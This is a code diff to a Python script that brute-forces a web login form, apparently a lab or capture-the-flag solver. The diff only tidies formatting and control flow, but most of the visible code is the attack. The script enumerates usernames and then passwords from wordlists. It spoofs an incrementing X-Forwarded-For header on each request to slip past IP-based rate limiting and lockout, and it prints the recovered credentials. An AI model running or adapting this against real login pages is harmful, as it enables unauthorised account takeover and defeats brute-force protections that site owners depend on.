@@ -6,9 +6,9 @@ import getopt
 
 def clear_screen():
   if os.name == 'posix':
-    clear_window = os.system('clear')
+    os.system('clear')
   else:
-    clear_window = os.system('cls')
+    os.system('cls')
 
 
 def get_username(url, session):
@@ -19,7 +19,7 @@ def get_username(url, session):
 
   for username in usernames:
     username = username.strip()
-    data = {'username' : username, 'password' :  password}
+    data = {'username': username, 'password':  password}
     headers = {'X-Forwarded-For': str(number)}
     number += 1
     response = session.post(url, headers=headers, data=data)
@@ -32,8 +32,6 @@ def get_username(url, session):
       valid_username = username
 
   usernames.close()
-  clear_screen()
-  print(f"[*] The username is: \"{valid_username}\"")
 
   return valid_username
 
@@ -44,7 +42,7 @@ def get_password(url, session, valid_username):
 
   for password in passwords:
     password = password.strip()
-    data = {'username' : valid_username, 'password' :  password}
+    data = {'username': valid_username, 'password':  password}
     headers = {'X-Forwarded-For': str(number)}
     number += 1
     response = session.post(url, headers=headers, data=data)
@@ -53,11 +51,8 @@ def get_password(url, session, valid_username):
 
     if "Invalid username or password." not in response.text:
       valid_password = password
-      break
-
-  passwords.close()
-
-  return valid_password
+      passwords.close()
+      return valid_password
 
 
 def main(argv):
@@ -80,6 +75,7 @@ def main(argv):
   username = get_username(url, session)
   password = get_password(url, session, username)
   clear_screen()
+  
   print(f"[*] The username is: \"{username}\"\n[*] The password is: \"{password}\"")
 
 
